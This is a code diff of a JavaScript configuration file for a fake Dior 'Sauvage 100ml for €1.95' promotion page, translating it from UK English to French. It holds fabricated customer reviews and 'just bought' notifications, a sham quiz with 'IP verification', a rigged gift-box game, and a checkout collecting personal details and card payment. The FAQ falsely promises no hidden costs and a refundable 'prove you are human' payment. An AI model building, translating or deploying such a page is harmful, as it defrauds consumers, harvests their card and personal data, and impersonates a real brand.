@@ -2,177 +2,160 @@ const orderHref = window.__order_href;
 const orderOriginParam = window.__origin_param;
 
 (function (exp) {
-  const countryCode = "gb";
-  const lang = "en-GB";
+  const countryCode = "fr";
+  const lang = "fr-FR";
   const locale = lang;
 
   const sizes = {
     enabled: false,
-    selectText: "Size: ",
-    arr: [
-      "XS",
-      "S",
-      "M",
-      "M/L",
-      "L",
-      "L/XL",
-      "XL",
-      "XXL"
-    ]
+    selectText: "Taille : ",
+    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
   };
 
-  // I FILL THIS INFO IN MAIN.JS 
+  // I FILL THIS INFO IN MAIN.JS
   const mainProduct = {
     header: "",
-    name: "Congratulations! You can join the Dior Sauvage 100ml promotion!",
+    name: "Félicitations ! Vous pouvez participer à la promotion Dior Sauvage 100ml !",
     oldPrice: "",
     newPrice: "",
     selectText: "",
-    text: "Dior is selling off its remaining Sauvage perfumes for just £1.95 after ceasing operations in Eastern Europe. Thanks to the new campaign strategy, everyone in the United Kingdom can get 1 of 1000 perfumes today🎁. <br><br> To receive a Sauvage from Dior, please fill out the form to confirm you are a real person. <br><br> Please hurry as the number of items on offer is limited!",
+    text: "Félicitations! <br><br> Vous pouvez participer à la promotion Dior Sauvage 100ml! <br><br> Dior vend ses derniers parfums Sauvage pour seulement 1,95€ après avoir cessé ses activités en Europe de l'Est. Grâce à la nouvelle stratégie de campagne, chaque Français peut obtenir aujourd'hui 1 des 1000 parfums🎁.<br><br> Pour recevoir un Sauvage de Dior, veuillez remplir le formulaire pour confirmer que vous êtes une personne réelle. <br><br> Dépêchez-vous, le nombre d'articles proposés est limité!",
   };
 
   const notifications = [
     {
-      user: "Odelia Ben***",
-      location: "London, United Kingdom",
-      action: "Just managed to buy Dior Sauvage 100ml for £1.95!",
-      timeago: "15 seconds ago",
+      user: "Béatrice Lameny",
+      location: "Paris, France",
+      action: "Je viens d'acheter Dior Sauvage 100ml pour 1.95€!",
+      timeago: "Il y a 15 secondes",
     },
     {
       user: "Tracey B***",
-      location: "Birmingham, United Kingdom",
-      action: "Just managed to buy Dior Sauvage 100ml for £1.95!",
-      timeago: "25 seconds ago",
+      location: "Lyon, France",
+      action: "Je viens d'acheter Dior Sauvage 100ml pour 1.95€!",
+      timeago: "Il y a 25 secondes",
     },
   ];
 
   const reviewsArr = [
     {
-      name: "Luis",
-      time: "1 day ago",
-      header: "This is amazing!",
+      name: "Jean-Pierre Dubourg",
+      time: "Il y a 1 jour",
+      header: "C'est incroyable !",
       product: "26468782",
-      review:
-        "As a long-time customer, I was really surprised to get my favorite menu at such a low price 😊.",
+      image: "./assets/proof1.jpg",
+      review: "J'ai récemment entendu parler de cette promotion et j'ai décidé de l'acheter. Merci Dior pour la vente!.",
     },
     {
-      name: "Antonio",
-      time: "2 days ago",
-      header: "Fantastic! I'm speechless.",
+      name: "Philou Filou",
+      time: "Il y a 2 jours",
+      header: "Fantastique ! Je suis sans voix.",
       product: "26468789",
-      review:
-        "First time participating in such promotions and I got the menu, thank you.",
+      image: "./assets/proof2.jpeg",
+      review: "Je vous remercie. Le colis a été livré très rapidement",
     },
     {
-      name: "Josef",
-      time: "2 days ago",
-      header: "Simply great.",
+      name: "Irice Appert",
+      time: "Il y a 2 jours",
+      header: "Tout simplement génial.",
       product: "26468783",
-      review:
-        "It was delicious, enough for the whole family and even had some leftovers.",
+      image: "./assets/proof3.jpg",
+      review: "Mon mari ne voulait pas que je participe car nous n'avions pas entendu parler de cette vente, mais lorsque mon colis est arrivé, il était très enthousiaste.",
     },
     {
-      name: "Miguel",
-      time: "4 days ago",
-      header: "I love it.",
-      review:
-        "Honestly, I love fast food, and this promotion was just for me.",
+      name: "Pierrick Josien",
+      time: "Il y a 4 jours",
+      header: "Je l'adore.",
+      image: "./assets/proof4.jpg",
+      review: "Je voulais ces parfums depuis longtemps et j'en ai enfin un.",
     },
     {
-      name: "Juan",
-      time: "7 days ago",
-      header: "Wow, I am absolutely delighted with this product!",
+      name: "Marc Duquesne",
+      time: "Il y a 7 jours",
+      header: "Wow, je suis absolument ravi de ce produit !",
       product: "26468784",
-      review:
-        "It must be a joke! At first, I thought it was a scam because of the price, but luckily I didn't pass up the offer and ordered it, thank you.",
+      image: "./assets/proof5.jpg",
+      review: "Incroyable. Parfum cher et de qualité pour seulement 1,95€. Je vous remercie!",
     },
   ];
 
   const reviews = {
     reviews: reviewsArr,
-    rr: "NOTES AND REVIEWS",
+    rr: "AVIS ET NOTES",
     percent: "99%",
-    rec: "comments on this action",
+    rec: "Commentaires sur cette action",
   };
 
   const questions = {
-    _of: "Question {1} of {2}: ",
+    _of: "Question {1} sur {2} : ",
     arr: [
       {
-        q: "Have you ever worn Dior Sauvage before?",
-        a: [
-          "Yes",
-          "No"
-        ],
-
+        q: "Avez-vous déjà porté Dior Sauvage?",
+        a: ["Oui", "Non"],
       },
       {
-        q: "Where did you find this sentence?",
-        a: [
-          "On the official website",
-          "Facebook adverts",
-          "Forwarded a friend"
-        ],
+        q: "Où avez-vous trouvé cette phrase?",
+        a: ["Sur le site officiel", "Publicités Facebook", "Transmis par un ami"],
       },
       {
-        q: "For what purpose you will use a Dior Sauvage?",
-        a: ["For a gift", "For personal use"],
+        q: "Dans quel but utiliserez-vous un Dior Sauvage?",
+        a: ["Pour un cadeau", "Pour usage personnel"],
       },
     ],
   };
 
   const check = {
-    title: "Your answers are being verified.",
+    title: "Vos réponses sont en cours de vérification.",
+    secondTitle: "Chargement...",
     arr: [
-      "You have answered question 3/3",
-      "There are no preliminary studies of your IP.",
-      "Gifts are loading...",
+      "Vous avez répondu à la question 3/3",
+      "Aucune étude préliminaire de votre IP.",
+      "Les cadeaux se chargent...",
     ],
   };
 
   const modals = {
     welcome: {
       texts: {
-        header:
-          "Congratulations, you have confirmed that you are a real person.",
+        header: "Félicitations, vous avez vérifié avec succès que vous êtes une personne réelle.",
         button: "OK",
         text: `
       <center>
-      Today, {date}, you have a chance to get your Dior Sauvage 100ml.
+      Aujourd'hui, {date}, vous avez la possibilité d'obtenir votre Dior Sauvage 100ml.
         <br><br>
-        All you have to do is choose the right gift box.
+        Il vous suffit de choisir le bon coffret cadeau.
         <br><br>
-        You have 3 guesses, good luck!
+        Vous avez 3 possibilités, bonne chance!
       </center>
     `,
       },
     },
     first: {
       texts: {
-        header: "Oh no...",
+        header: "Oh non...",
         button: "OK",
         text: `
       <center>
-      Sorry, but this gift is empty! You have 2 more attempts. Good luck!
+      Désolé, mais ce cadeau est vide ! Il vous reste 2 tentatives. Bonne chance !
       </center>
     `,
       },
     },
     win: {
       texts: {
-        header: `Congratulations! You win!`,
+        header: `Félicitations! Vous avez gagné!`,
         button: "OK",
         text: `
       <center>
         <p style="color: #b51817">
-        You've won the Dior Sauvage 100ml!
+        Vous avez gagné le Dior Sauvage 100ml!
         </p>
         <br>
-        1) Click "OK" below to go to the shipping payment page.
+        1) Cliquez sur "OK" ci-dessous pour accéder à la page de paiement de l'expédition.
          <br><br>
-        2) Fill in the form and pay for your order to receive your Dior Sauvage.
+        2) Remplissez le formulaire et payez votre commande pour recevoir votre Dior Sauvage.
         <br><br>
-        3) The package will be delivered within 5-7 days.
+        3) Le colis sera livré dans les 5 à 7 jours.
       </center>
     `,
       },
@@ -181,96 +164,96 @@ const orderOriginParam = window.__origin_param;
 
   const faqs = [
     {
-      question: "How long will I wait for my prize?",
-      answer: "It usually takes 5-7 working days."
+      question: "Combien de temps devrai-je attendre pour mon prix ?",
+      answer: "Cela prend généralement 5 à 7 jours ouvrables.",
     },
     {
-      question: "Are there any hidden costs?",
-      answer: "Absolutely not. Once you have won your prize and entered your details, we will take care of the rest. Shipping costs are our responsibility!"
+      question: "Y a-t-il des coûts cachés ?",
+      answer: "Absolument pas. Une fois que vous avez gagné votre prix et entré vos coordonnées, nous nous occupons du reste. Les frais de port sont à notre charge !",
     },
     {
-      question: "I'm a winner, why should I answer the questions/guess the box?",
-      answer: "You're not a winner yet, but you were one of the 10 people selected to try to win our prize..."
+      question: "Je suis gagnant, pourquoi devrais-je répondre aux questions/deviner la boîte ?",
+      answer: "Vous n'êtes pas encore gagnant, mais vous faites partie des 10 personnes sélectionnées pour tenter de remporter notre prix...",
     },
     {
-      question: "How can I get a prize if I win?",
-      answer: "First, you need to enter your shipping address and contact details, then our system will direct you. Then you have to prove that you are not a robot, as the prize is only offered to real people."
+      question: "Comment puis-je obtenir un prix si je gagne ?",
+      answer: "Tout d'abord, vous devez entrer votre adresse de livraison et vos coordonnées, puis notre système vous dirigera. Ensuite, vous devez prouver que vous n'êtes pas un robot, car le prix n'est offert qu'à de vraies personnes.",
     },
     {
-      question: "Why should I pay £1.95 for a prize?",
-      answer: "£1.95 is not a price - it is an upfront payment to prove that you are indeed human. All payments will be refunded once approved."
+      question: "Pourquoi devrais-je payer 1,95 € pour un prix ?",
+      answer: "1,95 € n'est pas un prix - c'est un paiement à l'avance pour prouver que vous êtes bien humain. Tous les paiements seront remboursés une fois approuvés.",
     },
     {
-      question: "Can't use my credit card, transaction failed?",
-      answer: "If you can't use your credit card, your bank is blocking the transaction: you need to check your bank account."
+      question: "Je ne peux pas utiliser ma carte de crédit, transaction échouée ?",
+      answer: "Si vous ne pouvez pas utiliser votre carte de crédit, votre banque bloque la transaction : vous devez vérifier votre compte bancaire.",
     },
   ];
 
   const cartSteps = {
     personal: {
-      title: "Personal Information",
+      title: "Informations personnelles",
       fields: {
         name: {
           enabled: true,
-          field: "First Name",
+          field: "Prénom",
         },
         family: {
           enabled: true,
-          field: "Last Name",
+          field: "Nom de famille",
         },
         phone: {
           enabled: true,
-          field: "Phone Number",
+          field: "Numéro de téléphone",
         },
         email: {
           enabled: true,
-          field: "Email",
+          field: "E-mail",
         },
       },
     },
     delivery: {
-      title: "Delivery",
+      title: "Livraison",
       fields: {
         city: {
           enabled: true,
-          field: "City",
+          field: "Ville",
         },
         address: {
           enabled: true,
-          field: "Delivery Address",
+          field: "Adresse de livraison",
         },
         zip: {
           enabled: true,
-          field: "Postal Code",
+          field: "Code postal",
         },
       },
     },
     payment: {
-      title: "Payment Methods",
-      creditCard: "Online payment by credit card",
+      title: "Modes de paiement",
+      creditCard: "Paiement en ligne par carte de crédit",
     },
   };
 
   const cart = {
     steps: cartSteps,
     main: {
-      title: "Order Summary",
+      title: "Récapitulatif de la commande",
       oldPrice: "",
-      newPrice: "£1.95",
-      size: "Size",
+      newPrice: "1,95 €",
+      size: "Taille",
       subTotal: {
-        title: "Order Value",
-        amount: "£1.95",
+        title: "Valeur de la commande",
+        amount: "1,95 €",
       },
       delivery: {
-        title: "Delivery",
-        amount: "£0.00",
+        title: "Livraison",
+        amount: "0,00 €",
       },
       total: {
         title: "Total",
-        amount: "£1.95",
+        amount: "1,95 €",
       },
-      checkoutButton: "Pay your order",
+      checkoutButton: "Payez votre commande",
     },
   };
 
@@ -283,11 +266,12 @@ const orderOriginParam = window.__origin_param;
       images: [
         "./assets/slide_1.png",
         "./assets/slide_2.png",
-        "./assets/slide_3.png",
-        "./assets/slide_4.png",
+        "./assets/slide_3.jpg",
+        "./assets/slide_4.jpg",
       ],
-    }
+    },
   ];
+
 
   const footer = {
     cr: "© 2024 DIOR. All rights reserved.",
